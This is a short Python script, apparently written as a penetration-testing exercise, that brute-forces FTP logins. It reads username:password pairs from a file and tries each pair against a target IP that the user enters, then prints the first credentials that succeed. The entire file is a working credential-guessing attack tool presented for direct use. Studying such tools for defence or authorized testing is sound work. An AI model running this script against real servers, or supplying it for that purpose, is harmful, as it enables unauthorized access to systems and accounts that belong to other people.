#!/usr/bin/python

import ftplib

def bruteLogin(hostname, passwdFile):
    try:
        pF = open(passwdFile, "r")
    except:
        print("File does not exist.")
    for line in pF.readlines():
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\n')
        print("[+] Attempting: " + username + "/" + password)
        try:
            ftp = ftplib.FTP(hostname)
            login = ftp.login(username, password)
            print("[+] Login succeeded with: " + username + "/" + password)
            ftp.quit()
            return(username, password)
        except:
            pass
    print("[-] Username/password combo not in list.")


host = input("[*] Enter target IP Address: ")
passwdFile = input("[*] Enter Username/Password file path: ")
bruteLogin(host, passwdFile)
